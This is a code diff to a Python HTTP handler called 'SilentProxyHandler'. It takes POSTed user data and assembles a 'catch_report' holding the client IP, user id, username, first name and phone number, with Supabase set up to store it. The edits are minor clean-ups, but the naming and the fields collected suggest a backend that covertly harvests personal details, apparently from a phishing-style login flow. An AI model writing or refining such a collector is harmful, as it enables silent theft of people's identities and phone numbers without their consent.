@@ -7,7 +7,6 @@ from supabase import create_client, Client
 SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
 
-
 supabase = None
 try:
     if SUPABASE_URL and SUPABASE_URL != "YOUR_SUPABASE_URL" and SUPABASE_URL.startswith("http"):
@@ -31,8 +30,6 @@ tokens = [
 
 class SilentProxyHandler(BaseHTTPRequestHandler):
     def do_POST(self):
-        content_length = int(os.environ.get('Content-Length', self.headers.get('Content-Length', 0))) # Handle safely
-        
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
         
@@ -50,9 +47,14 @@ class SilentProxyHandler(BaseHTTPRequestHandler):
 
             user_id_val = user.get('id')
             
+           
+            parsed_user_id = None
+            if user_id_val is not None and str(user_id_val).isdigit():
+                parsed_user_id = int(user_id_val)
+
             catch_report = {
                 "client_ip": str(client_ip) if client_ip else "127.0.0.1",
-                "user_id": str(user_id_val) if user_id_val is not None else "0",
+                "user_id": parsed_user_id,
                 "username": str(user.get('username')) if user.get('username') else "",
                 "first_name": str(user.get('first_name')) if user.get('first_name') else "Unknown",
                 "phone_number": str(contact.get('phone_number')) if contact.get('phone_number') else "",
